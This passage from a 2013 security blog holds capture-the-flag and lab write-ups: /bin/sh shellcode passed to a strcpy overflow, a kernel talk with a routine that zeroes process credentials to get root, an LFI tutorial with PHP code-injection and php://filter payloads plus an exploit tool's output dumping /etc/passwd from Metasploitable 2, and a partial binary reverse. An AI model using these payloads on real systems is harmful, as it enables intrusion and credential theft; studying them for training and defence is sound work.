can - research and research more - ask yourself the proper questions and don't run tools blindly - have a deep understanding of what's happening under the hood "Try harder AND smarter." I mostly learned: - be better organized for note taking, screenshots, etc - better pivoting and file transfer tricks - improved methodologies and intuition It was a nerve-wrecking certification. The most nerve-wrecking part was probably before submitting the final exam report. Spent a LOT of time checking and rechecking that nothing was missed. Anyone can do it. It is not as hard as everyone says it to be (impossible, etc). It is not an easy certification though. If you work hard, you are persistent and really keep at it, you'll end up getting it. Don't be discouraged by people saying it's super hard or almost impossible to get. If you really really really want something and do something about it, then you'll get it. You will end up having acquired hand-ons and practical skills actionable in the real world. This is not some theoretical useless certification. In all, it was an interesting and gratifying experience. It was a really fun course if you like rooting boxes like I do. Stay humble, work hard, be positive and keep at it :). Good luck to anyone trying to pass that certification. Publié par m_101 à 13:55 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   vendredi 27 décembre 2013 [Wargame] Ivan's Amenra : level 1 Hackeology : C'est un vieux challenge de 2010 plus disponible, je publie quand même le write-up (27/10/2010) qui trainait dans mes brouillons :). Enjoy. Bonsoir! J'ai retrouvé dans mes vieux bookmarks un challenge intéressant :). Ce qui différencie le wargame d'Ivan par rapport aux autres wargame est l'activation de l'ASLR et de quelques protections PaX. La preuve: level1@segment:~$ cat /proc/sys/kernel/randomize_va_space 
+2 On est accueilli par un message tout ce qu'il y a de plus classique : Linux segment 2.6.35.7-grsec #3 Thu Oct 14 18:08:24 CEST 2010 i686
+_____    _____   ____   ________________   
+\__  \  /     \_/ __ \ /    \_  __ \__  \  
+ / __ \|  Y Y  \  ___/|   |  \  | \// __ \_
+(____  /__|_|  /\___  >___|  /__|  (____  /
+     \/      \/     \/     \/           \/ 
+
+
+        Amenra wargaming platform
+
+levels are in /home/levelX
+pass are in /home/levelX/passwd
+
+Infos :
+Debian squeeze 2.6.34 (eglibc 2.11.2) with kernel patch grsecurity, w00t !
+To check if level's stack is +x use : /sbin/paxctl -v levelX
+Box reboots everyday
+Box can be unstable
+Box pic http://ivanlef0u.nibbles.fr/repo/img/boite2konserv.jpg 
+Be ethical or die !
+
+Tools :
+objdump & readelf
+gdb 7.2 : symbols files are avaible, if you want to use them do:
+set debug-file-directory /usr/lib/debug
+python 2.6.6
+ruby 1.8.7
+nano & vim
+gcc 4.4.5 & nasm
+strace & ltrace
+
+contact : ivanlef0u@tuxfamily.org Ok cool, maintenant passons au level1 si vous voulez bien :). // level1.c
+// gcc -fno-stack-protector -mpreferred-stack-boundary=2 -Wall level1.c -o level1
+// paxctl -c -p -s -m -r -x -s level1
+//
+
+#include <string.h>
+
+int main(int argc, char * argv[])
+{
+    char buf[8];
+
+    strcpy(buf, (char *)argv);
+
+    return 0;
+} Comme d'hab', on va regarder le code assembleur : level1@segment:~$ gdb ./level1 
+Reading symbols from /home/level1/level1...(no debugging symbols found)...done.
+gdb$ disassemble main
+Dump of assembler code for function main:
+   0x080483c4 <+0>: push   ebp
+   0x080483c5 <+1>: mov    ebp,esp
+   0x080483c7 <+3>: sub    esp,0x10
+   0x080483ca <+6>: mov    eax,DWORD PTR [ebp+0xc]
+   0x080483cd <+9>: mov    DWORD PTR [esp+0x4],eax
+   0x080483d1 <+13>: lea    eax,[ebp-0x8]
+   0x080483d4 <+16>: mov    DWORD PTR [esp],eax
+   0x080483d7 <+19>: call   0x80482fc <strcpy@plt>
+   0x080483dc <+24>: mov    eax,0x0
+   0x080483e1 <+29>: leave  
+   0x080483e2 <+30>: ret    
+End of assembler dump.
+gdb$ quit Bon reste plus qu'à poutrer ça le plus simplement du monde :). En reconstruisant la stack de tête, on a un truc du genre: ret
+sfp
+buffer+4
+buffer On copie argv dans buffer or argv est un tableau de pointeurs des arguments passés au programme. Le premier argument étant le nom du programme, il faut passer 3 arguments supplémentaires. Ce qui va se passer est que l'adresse de notre 4 ème argument va overwriter l'adresse de retour sur la pile. C'est donc dans cette argument qu'on mettra notre shellcode. level1@segment:~$ ~/level1 a b `printf "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"`
+$ Pawned, Pour le level2 ça va attendre encore un petit moment, m_101 Publié par m_101 à 15:27 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Libellés : challenge , exploit , wargame Réactions :   mercredi 18 décembre 2013 December HZV Meet : Linux Kernel Exploitation Hello, So, last Saturday, I did a talk about Linux Kernel Exploitation. I went over some well known vulnerabilities and I ended with a demo on a kernel exploitation challenge (here) by Jason Donenfeld (his site). The slides are at the end of this blog article. In this post, I will detail a bit more some of the slides in the talk. I will not detail every single slides, only the ones where I think there isn't enough details. If you don't understand some things, don't hesitate to comment ;). So, let's dig in. Linux Kernel The kernel has LOTS of code. 15+ millions lines of code. LOTS of code mean complexity, complexity mean bugs and bugs mean potential vulnerabilities ;). Anyhow, the main gateway for users to interact with the kernel are syscalls and IOCTLs. Behind a syscall, especially network ones, there is a TONS of code. Effectively, for a bind() call, you have the same interface right? Well, the kernel, find the corresponding structure using the socket descriptor you use with your bind call. In that structure, there is what is called a struct proto_ops which contains callbacks for the corresponding protocol. Exploiting the Linux Kernel The Linux Kernel is made of code, it is software. And everyone do know that software has bugs and vulnerabilities. The Linux Kernel is not an exception. You will mostly find all the vulnerabilities you know from userland: - stack based buffer overflows - heap based buffer overflows - race conditions - integer signedness issues - information leaks - initialisation issues - etc And some different ones: - NULL Pointer Dereference - stack overflow (real ones, not based on) - process manipulation tricks (mempodipper) - etc __copy_to_user() and copy_to_user() are not the same. The first one doesn't check that the address effectively live in userland while the second one do that. The goal of exploiting the kernel is mainly to get root. NULL Pointer Dereference It was (is?) exploitable in kernel simply because you could (can?) map the NULL page in your exploit as it lives in userland. As such, it doesn't crash. Heuristics These are routines that allow you to have good enough approximations. For instance, before 2.6.29, credentials were stored like this in the kernel: /*
+Kernel 2.6.23
+include/linux/sched.h
+*/
+
+struct task_struct {
+/* ... */
+
+/* process credentials */
+    uid_t uid,euid,suid,fsuid;
+    gid_t gid,egid,sgid,fsgid;
+    struct group_info *group_info;
+    kernel_cap_t   cap_effective, cap_inheritable, cap_permitted;
+    unsigned keep_capabilities:1;
+    struct user_struct *user;
+
+/* ... */
+}; As you can see, uid, euid and suid will generally have the same value. So if you set thos values to 0, your process basically has root privileges. This heuristic is good enough as there is little chance that you will have 3 dwords with the same values in memory (don't forget we start to search from our current task_struct that represent our exploit process). This routine before 2.6.29 was thus enough to get root: // get root before 2.6.29 kernel
+void get_root_pre_2_6_29 (void)
+{
+    uid_t uid, *cred;
+    size_t byte;
+
+    uid = getuid();
+    cred = get_task_struct();
+    if (!cred)
+        return;
+
+    for (byte = 0; byte < PAGE_SIZE; byte++) {
+        if (cred[0] == uid
+                && cred[1] == uid
+                && cred[2] == uid) {
+            cred[0] = cred[1] = cred[2] = cred[3] = 0;
+            cred[4] = cred[5] = cred[6] = cred[7] = 0;
+        }
+        cred++;        
+    }
+}
+ Root in 3 big steps You've basically got 3 big steps: prepare, trigger vulnerability, trigger payload. Prepare This is the most important step as this will greatly affect the reliability of your exploit. This is where you: - check that the kernel is vulnerable. - use information leaks - prepare the memory layout so you can predict reliably where your objects are - place your shell code in memory The avantage of shellcoding in the kernel : it is in C. Trigger vulnerability This is where you will exploit your vulnerability. Patching memory, pointers and whatsoever. Trigger payload This is where you escalate the privileges of your process. This is also where you fix the mayhem you may have caused earlier. It is REALLY important to fix the things you messed up as otherwise the machine may crash later. It is done in the payload as the payload is executed in kernel mode. root is in userland, root != kernel land, don't get confused about that. After triggering the payload, you go back in userland and spawn your root shell or whatsoever. Ok, now that you have the basic understanding, you are ready for some kernel goodies. Linux Kernel Exploitation I won't explain CVE-2009-2692 unless some people ask for it. It is simple enough using the slides to comprehend. Anyhow, let's dig in TUN NULL Pointer Dereference. TUN NULL Pointer Dereference This vulnerability is really interesting as there is something really special about it : the vulnerability is NOT in the source code. It is inserted at compilation. Basically, what happens is that tun is dereferenced before checking that tun is NULL. As such, GCC considers that the pointer doesn't need checking as we use it before checking : GCC removes the NULL check. Boom, vulnerability. The vulnerable code: static unsigned int tun_chr_poll(struct file *file, poll_table * wait)
+{
+    struct tun_file *tfile = file->private_data;
+    struct tun_struct *tun = __tun_get(tfile);
+    struct sock *sk = tun->sk;
+    unsigned int mask = 0;
+
+    if (!tun)
+        return POLLERR;
+
+    /* ... */
+
+    if (sock_writeable(sk) ||
+        (!test_and_set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags) &&
+         sock_writeable(sk)))
+        mask |= POLLOUT | POLLWRNORM;
+
+    /* ... */
+
+    return mask;
+}
+ So the NULL check doesn't exist and tun is NULL. So we can map the NULL page and we thus control tun->sk. We control sk->sk_socket->flags as well. test_and_set_bit() set the last bit at 1. Bang, we can set any NULL pointer to 1. In the exploit, mmap() is chosen as the TUN device doesn't have a mmap(). mmap() need to be see to one even though we control the NULL page as internally mmap() is not called if it's NULL. Put a trampoline at address 1 to jump over all the junk you've set up and go to your payload. And that it's, you've escalated your privileges. Why mmap() can't be NULL? If you dig around in the kernel, here is what to look for: // arch/x86/kernel/sys_x86_64.c:21: asmlinkage long sys_mmap(unsigned long addr, unsigned long len,
+asmlinkage long sys_mmap(unsigned long addr, unsigned long len,
+        unsigned long prot, unsigned long flags,
+        unsigned long fd, unsigned long off)
+{
+    long error;
+    struct file *file;
+
+    error = -EINVAL;
+    if (off & ~PAGE_MASK)
+        goto out;
+
+    error = -EBADF;
+    file = NULL;
+    flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);
+    if (!(flags & MAP_ANONYMOUS)) {
+        file = fget(fd);
+        if (!file)
+            goto out;
+    }
+    down_write(&current->mm->mmap_sem);
+    error = do_mmap_pgoff(file, addr, len, prot, flags, off >> PAGE_SHIFT);
+    up_write(&current->mm->mmap_sem);
+
+    if (file)
+        fput(file);
+out:
+    return error;
+} If you go down do_mmap_pgoff(), you end up finding this code: // mm/mmap.c
+
+/* ... */ 
+
+            if (!file->f_op || !file->f_op->mmap)
+                return -ENODEV;
+            break;
+
+/* ... */ So here it is, if mmap() is NULL, it doesn't get called. That is why it sets the mmap() pointer to 1. Other exploits This is where it gets pretty hard to explain as there is still tons of code to read x). I dug a bit in vmsplice, RDS and perf_events exploits. vmsplice use buffer overflow, but it's not a common one as it doesn't overwrite any function or return pointers. What it overwrites are compound page addresses (values we don't control) and then call a dtor pointer the attacker control. Privileged code execution is gained in put_compound_page() through the call of a destructor function pointer that we control. This dtor pointer obviously points to the attacker payload. At the end of the article, I've attached some analysis I did for vmsplice. There is lot of code to cover though so I won't detail it in this post. I haven't thoroughly analyzed the RDS exploit yet but it is a write-what-where. The perf_events exploit is really interesting. It 'basically' increment a INT handler pointer upper bytes in 64 bits so the pointer end up in userland. The exploit then return to this allocated memory containing the payload. The exploit also use a neat trick to compute the perf_event array. An entire post is necessary as well to properly understand this exploit. Analysis have already been done anyhow by other people. The challenge The VM is a 64 Bit Linux system made especially by Jason Donenfeld (aka zx2c4). The vulnerability allows us to write a 0 anywhere in kernel memory. As such, in my exploit, I zeroed out some part of a proto_ops function pointer. mmap() it, put my payload over there, jump to it and fix it. I debugged the exploit using registry information showed when the exploit crashed. The exploit is included in the archive below. Conclusion As you can see, kernel exploitation has some similitudes with userland exploitation. The differences mainly stem in the protections and the impact that a bug can have. For instance, in kernel-land, not initializing a structure fully can have severe consequence (code execution through NULL pointer dereference, etc) while in userland, it may cause an infoleak but not directly code execution. Moreover, this also shows that the kernel is piece of software and is as such exploitable. Hope you enjoyed the article, I welcome any feedback on it, Cheers, m_101 References - The slides : here - Jason Donenfield's challenge : here - sgrakkyu's blog : http://kernelbof.blogspot.fr/ - Attacking the Core : Kernel Exploiting Note - "A Guide to Kernel Exploitation: Attacking the Core" de Enrico Perla et Massimiliano Oldani - Miscellaneous exploits : NULL deref sendpage, NULL deref /dev/net/tun, vmsplice, RDS write-what-where, integer problem perf_swevent - MISC explaining perf_swevent exploit : Misc 69 Publié par m_101 à 19:09 1 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   vendredi 13 décembre 2013 LFI Exploitation : Basics, code execution and information leak Hello, Today, I played a bit with Metasploitable 2. It is really easy to root, so that's not the interest of this blog post. Anyhow, I played a bit around and I ended up coding a basic LFI exploit tool. So yet another post on LFI exploitation ... So what is LFI? LFI stands for Local File Inclusion. It is a vulnerability that allows you to include local files. Many people do think that it's not really dangerous as it only includes LOCAL files. Unfortunately (depending on which side of the barrier you are ...), it is false, you can execute code through a LFI. So, how do you exploit it? By including local files. Yes, local files :). These are the well-known techniques for LFI: - apache logs - /proc/self/environ - php://input - NULL Byte Injection - path truncation - directory traversal - PHP filters - image inclusion with PHP code Apache logs These were publicly accessible in old distros. Now, these are only readable by proper users. You'd basically inject PHP Code through the GET requests: http://victim/<?php system ('id'); ?> This would leave PHP code in the logs. Then executing the PHP code is as simple as: http://victim/?page=/var/log/apache2/access_log Code execution if there is no proper rights on the logs (some old systems remain). /proc/self/environ This file is interesting as it stores stuffs like your USER-AGENT and whatsoever. So, if you change your User-Agent to <?php system ('id'); ?> and use this: http://victim/?page=/proc/self/environ Yes, code execution! php://input Ok, this one execute PHP Code included into the POST DATA. NULL byte injection and path truncation This one is pretty neat. Say you have the following code: <?php include ($_GET['page'] . '.php'); ?> Well, you can get rid of the '.php' extension using that trick. Just append or looooooots of . or /., this will get normalized and voila no more extension. NULL Byte poisoning doesn't work for PHP >= 5.3.4 as it's been fixed. Reverse path truncation is mostly the same, just the ../ is before the file name. PHP filters This vulnerability is mainly for leaking files (.php and others). This doesn't work if you have a prefix such as here: <?php include ($prefix + $_GET['page'] + '.php'); ?> You exploit it using this request for instance: http://victim/?page=php://filter/read=convert.base64-encode/resource=index.php As you guessed, the PHP filter is php://filter/read=convert.base64-encode/resource= . image with PHP code This one is about appending PHP code in an image. Using the image in the LFI allows you to inject PHP code : the PHP interpreter interprets anything as code as long as it's in <?php ?>. If you have a non exploitable LFI with /proc/self/environ or apaches logs and you don't have an extension concatenation, this can allow you to exploit it if you are able to upload images. Let's say you have PHPBB and PhpLdapAdmin 1.1.0.5. Well, you can upload an image using PHPBB then exploit the LFI in PhpLdapAdmin using the directory traversal trick => code execution. Exploit I wrote a basic LFI exploiter that uses PHP filter or /proc/self/environ tricks. You can get it at LFI exploit tool . The code isn't clean and it needs tons of improvement before being really a usable tool. I plan on improving it on a need to basis. The cookie functionality is not implemented yet, it is just a placeholder for now. You can test it on multilidae on Metasploitable 2. I haven't tested it somewhere else yet. Example of utilisation (this is on metasploitable 2): $ ./exploit-lfi.py -h
+usage: exploit-lfi.py [-h] --url URL [--action ACTION] --option OPTION
+                      [--replace REPLACE] [--cookie COOKIE]
+
+Exploit LFI
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --url URL, -u URL     URL to attack
+  --action ACTION, -a ACTION
+                        exec or read (default)
+  --option OPTION, -o OPTION
+                        Action argument
+  --replace REPLACE, -r REPLACE
+                        string to replace
+  --cookie COOKIE, -c COOKIE
+                        Cookie
+$ ./exploit-lfi.py -u 'http://192.168.56.107/mutillidae/index.php?page=show-log.php' -o 'cat /etc/passwd'
+[+] Checking vulnerability
+Test url : http://192.168.56.107/mutillidae/index.php?page=whatever&
+Is vulnerable with param page!
+[+] Found vulnerability, new URL : http://192.168.56.107/mutillidae/index.php?page=PAYLOAD&
+[+] Searching for root path
+root : ../../../
+[+] New URL : http://192.168.56.107/mutillidae/index.php?page=../../../PAYLOAD&
+[+] Testing : {'path': '/proc/self/environ', 'type': 'header'}
+    http://192.168.56.107/mutillidae/index.php?page=../../..//proc/self/environ&
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+snmp:x:115:65534::/var/lib/snmp:/bin/false Conclusion As you can see in this introduction, code execution is quite possible with a LFI. These aren't only information leaks vulnerabilities. That's all for today. Cheers, m_101 Updates - 18/12/2013 : the LFI exploit tool I wrote has been moved to its own repository : https://github.com/m101/lfipwn/ and cookie functionality does work. References - Basics on file inclusion : http://www.blackhatlibrary.net/File_Inclusion - PhpLdapAdmin LFI : http://www.exploit-db.com/exploits/10410/ - path truncation part 1 : http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/ - path truncation part 2 : http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/ Publié par m_101 à 23:06 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   mardi 20 août 2013 [Root-Me] Remote Binary 2 - An advanced remote format string example Hello, Sorry, this article has been removed in order to respect the root-me rules. However, for anyone who solved the challenge, you can get the article using the found flag :). I'll post the article once I fix the exploit. Cheers, m_101 Publié par m_101 à 21:10 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   lundi 10 juin 2013 Vanilla1 : write-what-where exploitation (ASLR, Full RELRO, Stack cookie) Hello, For today article, we're going to analyze and exploit a write-what-where with ASLR, no PIE, full RELRO and stack cookie. This is part of a set of challenges made by sm0k: Vanilla Dome Wargame . Let's begin. The challenge Before any reversing attempt, we need to launch the program to see what it does. vanilla1@VanillaDome ~ $ ls -lash
+total 76K
+4.0K drwxr-xr-x  2 root          root          4.0K Apr 29 14:15 .
+4.0K drwxr-x--x 10 root          root          4.0K May 15 20:52 ..
+4.0K -rw-r--r--  1 root          root           127 Mar 23 05:56 .bash_logout
+4.0K -rw-r--r--  1 root          root           193 Mar 23 05:56 .bash_profile
+4.0K -rw-r--r--  1 root          root          3.9K Apr 29 15:47 .bashrc
+ 44K -rw-r--r--  1 root          root           44K Apr 29 14:15 .gdbinit
+8.0K -r-sr-sr-x  1 vanilla1crack vanilla1crack 6.7K Apr 29 12:28 Vanilla1
+4.0K -r--------  1 vanilla1crack vanilla1crack   19 Apr 29 12:28 key
+vanilla1@VanillaDome ~ $ ./Vanilla1 
+     Usage:./Vanilla1 <file>
+vanilla1@VanillaDome ~ $ ./Vanilla1 key
+vanilla1@VanillaDome ~ $ python -c 'print "a" * 1024' > /tmp/file.txt
+vanilla1@VanillaDome ~ $ ./Vanilla1 /tmp/file.txt Ok, it basically read some file and do stuffs with it ... Let's reverse it Opening GDB and disassembling main we get the following: Dump of assembler code for function main:
+   0x08048578 <+0>:    push   ebp
+   0x08048579 <+1>:    mov    ebp,esp
+   0x0804857b <+3>:    and    esp,0xfffffff0                   ; alignment
+   0x0804857e <+6>:    sub    esp,0x1050                       ; there is a HUGE buffer and we have ebp = esp + 0x1050
+   0x08048584 <+12>:    mov    eax,DWORD PTR [ebp+0x8]          ; argc
+   0x08048587 <+15>:    mov    DWORD PTR [esp+0x1c],eax         ; n_arg = argc
+   0x0804858b <+19>:    mov    eax,DWORD PTR [ebp+0xc]          ; argv
+   0x0804858e <+22>:    mov    DWORD PTR [esp+0x18],eax         ; args = argv
+   0x08048592 <+26>:    mov    eax,gs:0x14                      ; eax = stack cookie
+   0x08048598 <+32>:    mov    DWORD PTR [esp+0x104c],eax       ; stack cookie (stored in gs:0x14)
+   0x0804859f <+39>:    xor    eax,eax
+   0x080485a1 <+41>:    cmp    DWORD PTR [esp+0x1c],0x1         ; if (n_arg <= 1) then error
+   0x080485a6 <+46>:    jg     0x80485c4 <main+76>              ; else continue
+
+   0x080485a8 <+48>:    mov    eax,DWORD PTR [esp+0x18]         ; args ptr
+   0x080485ac <+52>:    mov    edx,DWORD PTR [eax]              ; program name
+   0x080485ae <+54>:    mov    eax,0x8048790                    ; format = "\t Usage:%s <file>\n"
+   ; printf ("\t Usage:%s <file>\n", argv[0]);
+   0x080485b3 <+59>:    mov    DWORD PTR [esp+0x4],edx
+   0x080485b7 <+63>:    mov    DWORD PTR [esp],eax
+   0x080485ba <+66>:    call   0x8048434 <printf@plt>
+   0x080485bf <+71>:    jmp    0x80486a9 <main+305>          ; bye
+
+   ; memset (esp+0x38, 0x0, 0x1000);
+   0x080485c4 <+76>:    mov    DWORD PTR [esp+0x34],0x0         ; fp = NULL;
+   0x080485cc <+84>:    mov    DWORD PTR [esp+0x8],0x1000
+   0x080485d4 <+92>:    mov    DWORD PTR [esp+0x4],0x0
+   0x080485dc <+100>:    lea    eax,[esp+0x38]
+   0x080485e0 <+104>:    mov    DWORD PTR [esp],eax
+   0x080485e3 <+107>:    call   0x80483f4 <memset@plt>
+
+   ; fp = fopen (argv[1], "r");
+   0x080485e8 <+112>:    mov    edx,0x80487a3                    ; "r"
+   0x080485ed <+117>:    mov    eax,DWORD PTR [esp+0x18]         ; args
+   0x080485f1 <+121>:    add    eax,0x4
+   0x080485f4 <+124>:    mov    eax,DWORD PTR [eax]              ; eax = args[1];
+   0x080485f6 <+126>:    mov    DWORD PTR [esp+0x4],edx
+   0x080485fa <+130>:    mov    DWORD PTR [esp],eax
+   0x080485fd <+133>:    call   0x8048424 <fopen@plt>
+   0x08048602 <+138>:    mov    DWORD PTR [esp+0x34],eax
+   0x08048606 <+142>:    cmp    DWORD PTR [esp+0x34],0x0         ; if (fp == NULL) then error
+   0x0804860b <+147>:    je     0x80486a9 <main+305>
+   0x08048611 <+153>:    jmp    0x8048682 <main+266>          ; else fgets
+
+   ; value1 = atoll (buffer);
+   0x08048613 <+155>:    lea    eax,[esp+0x1038]                 ; this is a small buffer (ebp-0x1050+0x1038 = ebp-0x18)
+   0x0804861a <+162>:    mov    DWORD PTR [esp],eax
+   0x0804861d <+165>:    call   0x8048414 <atoll@plt>
+   0x08048622 <+170>:    mov    DWORD PTR [esp+0x30],eax
+   ; fgets (sbuffer, 0x14, fp);
+   0x08048626 <+174>:    mov    eax,DWORD PTR [esp+0x34]         ; eax = fp
+   0x0804862a <+178>:    mov    DWORD PTR [esp+0x8],eax
+   0x0804862e <+182>:    mov    DWORD PTR [esp+0x4],0x14
+   0x08048636 <+190>:    lea    eax,[esp+0x1038]                 ; sbuffer
+   0x0804863d <+197>:    mov    DWORD PTR [esp],eax
+   0x08048640 <+200>:    call   0x80483e4 <fgets@plt>
+   ; value2 = atoll(sbuffer);
+   0x08048645 <+205>:    lea    eax,[esp+0x1038]
+   0x0804864c <+212>:    mov    DWORD PTR [esp],eax
+   0x0804864f <+215>:    call   0x8048414 <atoll@plt>
+   0x08048654 <+220>:    mov    DWORD PTR [esp+0x2c],eax
+   0x08048658 <+224>:    cmp    DWORD PTR [esp+0x30],0x0         ; if (value1 == 0) then fgets
+   0x0804865d <+229>:    je     0x8048682 <main+266>
+
+   0x0804865f <+231>:    cmp    DWORD PTR [esp+0x2c],0x0         ; if (value2 == 0) then fgets
+   0x08048664 <+236>:    je     0x8048682 <main+266>
+
+   ; insert (value2, value1, esp+0x38);
+   0x08048666 <+238>:    lea    eax,[esp+0x38]
+   0x0804866a <+242>:    mov    DWORD PTR [esp+0x8],eax
+   0x0804866e <+246>:    mov    eax,DWORD PTR [esp+0x30]         ; eax = value1
+   0x08048672 <+250>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048676 <+254>:    mov    eax,DWORD PTR [esp+0x2c]         ; eax = value2
+   0x0804867a <+258>:    mov    DWORD PTR [esp],eax
+   0x0804867d <+261>:    call   0x8048534 <insert>
+
+   ; fgets (buffer, 0x14, fp);
+   0x08048682 <+266>:    mov    eax,DWORD PTR [esp+0x34]         ; eax = fp
+   0x08048686 <+270>:    mov    DWORD PTR [esp+0x8],eax
+   0x0804868a <+274>:    mov    DWORD PTR [esp+0x4],0x14
+   0x08048692 <+282>:    lea    eax,[esp+0x1038]                 ; buffer
+   0x08048699 <+289>:    mov    DWORD PTR [esp],eax
+   0x0804869c <+292>:    call   0x80483e4 <fgets@plt>
+   0x080486a1 <+297>:    test   eax,eax                          ; if (still data) then loop
+   0x080486a3 <+299>:    jne    0x8048613 <main+155>
+
+   ; check cookie
+   0x080486a9 <+305>:    mov    eax,0x0
+   0x080486ae <+310>:    mov    edx,DWORD PTR [esp+0x104c]       ; stack cookie
+   0x080486b5 <+317>:    xor    edx,DWORD PTR gs:0x14
+   0x080486bc <+324>:    je     0x80486c3 <main+331>
+
+   0x080486be <+326>:    call   0x8048444 <__stack_chk_fail@plt>
+   0x080486c3 <+331>:    leave 
+   0x080486c4 <+332>:    ret   
+End of assembler dump. We basically have a main() which read the file with fgets() and use atoll() in an insert function. We can reconstruct the stack also. We can see in the code that ESP is used but it is not convenient for calculating sizes. We get the following stack values in the end for main(): esp+0x2c        <-> ebp-0x1050+0x2c-0x8 = ebp-0x102c    ; value2
+esp+0x30        <-> ebp-0x1050+0x30-0x8 = ebp-0x1028    ; value1
+esp+0x34        <-> ebp-0x1050+0x34-0x8 = ebp-0x1024    ; fp
+esp+0x38        <-> ebp-0x1050+0x38-0x8 = ebp-0x1020    ; buffer (0x1000 = 4096 bytes)
+esp+0x1038      <-> ebp-0x1050+0x1038-0x8 = ebp-0x20    ; sbuffer (0x14 = 20 bytes)
+esp+0x104c      <-> ebp-0x1050+0x104c-0x8 = ebp-0xc     ; stack cookie Don't forget -0x8 which correspond to seip and sebp ;). sbuffer is a temporary buffer which is used by fgets(). value1 and value2 are integers converted from sbuffer through atoll(). fp is the file pointer used for referencing the file. Having all the values, we can reconstruct the stack properly:             STACK TOP = LOW ADDRESSES
+
+            esp         |   arg0
+            esp+0x4     |   arg1
+        ^   esp+0x8     |   arg2                |
+        |   ebp-0x102c  |   value2              |
+        |   ebp-0x1028  |   value1              |
+  PUSH  |   ebp-0x1024  |   fp                  |   POP
+        |   ebp-0x1020  |   buffer              |
+        |           .....                       |
+        |   ebp-0x20    |   end buffer          |
+        |   ebp-0x20    |   sbuffer             V
+            ebp-0xc     |   stack cookie
+            ebp         |   sebp
+            ebp+0x4-blog     |   seip
+            ebp+0x8     |   argc
+            ebp+0xc     |   argv
+
+            STACK BOTTOM = HIGH ADDRESSES Following the ASM, the main should look something like this: #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main (int argc, char *argv[])
+{
+    int value1, value2;
+    FILE *fp;
+    char buffer[4096], sbuffer[20];
+
+    if (argc <= 1) {
+        printf ("\t Usage:%s <file>\n", argv[0]);
+        return 0;
+    }
+
+    memset (buffer, 0, 0x1000);
+
+    fp = fopen (argv[1], "r");
+    if (fp == NULL)
+        return 0;
+
+    while (fgets (sbuffer, 0x14, fp) != NULL) {
+        value1 = atoll (sbuffer);
+        fgets (sbuffer, 0x14, fp);
+        value2 = atoll (sbuffer);
+        if (value1 != 0 && value2 != 0)
+            insert (value2, value1, buffer);
+    }
+
+    return 0;
+} The file is basically structured as a sequence of string values: value1 | value2 | value1 | value2 | .... | value1 | value2 Don't forget that atoll() only convert leading characters [0-9]+ to an integer, any following characters that are not numbers are not converted. Now onto insert reversing: Dump of assembler code for function insert:
+   0x08048534 <+0>:    push   ebp
+   0x08048535 <+1>:    mov    ebp,esp
+   0x08048537 <+3>:    sub    esp,0x28
+   0x0804853a <+6>:    mov    eax,DWORD PTR [ebp+0x8]              ; eax = value2
+   0x0804853d <+9>:    mov    DWORD PTR [ebp-0x1c],eax
+   0x08048540 <+12>:    mov    eax,DWORD PTR [ebp+0xc]              ; eax = value1
+   0x08048543 <+15>:    mov    DWORD PTR [ebp-0x20],eax
+   0x08048546 <+18>:    mov    eax,DWORD PTR [ebp+0x10]             ; eax = buffer
+   0x08048549 <+21>:    mov    DWORD PTR [ebp-0x24],eax
+   0x0804854c <+24>:    mov    eax,gs:0x14                          ; stack cookie
+   0x08048552 <+30>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048555 <+33>:    xor    eax,eax
+   0x08048557 <+35>:    mov    eax,DWORD PTR [ebp-0x1c]
+   0x0804855a <+38>:    shl    eax,0x2                              ; value2 <<= 2;
